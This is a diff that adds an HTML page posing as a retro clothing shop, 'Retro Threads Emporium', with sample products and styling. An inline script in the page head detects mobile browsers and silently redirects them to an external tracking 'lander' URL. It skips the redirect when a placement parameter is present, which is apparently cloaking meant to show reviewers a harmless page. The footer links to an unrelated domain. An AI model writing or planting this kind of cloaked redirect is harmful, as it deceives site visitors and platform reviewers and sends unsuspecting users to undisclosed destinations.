@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmXXX = urlParams.get("xxx");
+    const s = urlParams.get("s");
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const lander = `https://klcxb6.mcgo2.com/visit/de9fa2b0-1366-489a-be81-3b73f541059f?s1=${s}`;
+    if (utmXXX === "__PLACEMENT__") { }
+    else if (isMobileDevice) { window.location.href = lander; } 
+    else { }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Retro Threads Emporium</title>
+    <style>
+        body {
+            font-family: 'Courier New', monospace;
+            background-color: #FFD700;
+            color: #8B4513;
+            margin: 0;
+            padding: 0;
+        }
+        header {
+            background-color: #FF6347;
+            padding: 20px;
+            text-align: center;
+        }
+        h1 {
+            font-size: 3em;
+            text-shadow: 2px 2px #FFA500;
+        }
+        nav {
+            background-color: #20B2AA;
+            padding: 10px;
+        }
+        nav ul {
+            list-style-type: none;
+            padding: 0;
+        }
+        nav ul li {
+            display: inline;
+            margin-right: 20px;
+        }
+        nav ul li a {
+            color: #FFFFFF;
+            text-decoration: none;
+            font-weight: bold;
+        }
+        main {
+            padding: 20px;
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-around;
+        }
+        .product {
+            background-color: #DDA0DD;
+            border: 3px solid #4B0082;
+            border-radius: 15px;
+            padding: 15px;
+            margin: 10px;
+            width: 200px;
+            text-align: center;
+        }
+        footer {
+            background-color: #FF6347;
+            color: #FFFFFF;
+            text-align: center;
+            padding: 10px;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Retro Threads Emporium</h1>
+    </header>
+    <nav>
+        <ul>
+            <li><a href="#">Home</a></li>
+            <li><a href="#">Shop</a></li>
+            <li><a href="#">About</a></li>
+            <li><a href="#">Contact</a></li>
+        </ul>
+    </nav>
+    <main>
+        <div class="product">
+            <h2>Groovy Bellbottoms</h2>
+            <p>Far out, man! These bellbottoms are the real deal.</p>
+            <p>Price: $49.99</p>
+        </div>
+        <div class="product">
+            <h2>Disco Fever Shirt</h2>
+            <p>Shine bright like a disco ball in this flashy number!</p>
+            <p>Price: $34.99</p>
+        </div>
+        <div class="product">
+            <h2>Psychedelic Sundress</h2>
+            <p>Turn heads with this mind-bending pattern!</p>
+            <p>Price: $59.99</p>
+        </div>
+        <div class="product">
+            <h2>Vintage Leather Jacket</h2>
+            <p>Channel your inner rebel with this classic piece.</p>
+            <p>Price: $89.99</p>
+        </div>
+    </main>
+    <footer>
+        <p>&copy; 2023 Retro Threads Emporium. All rights reserved. <a href="https://tokreward.com/privacy.html">Privacy Policy</a></p>
+    </footer>
+</body>
+</html>
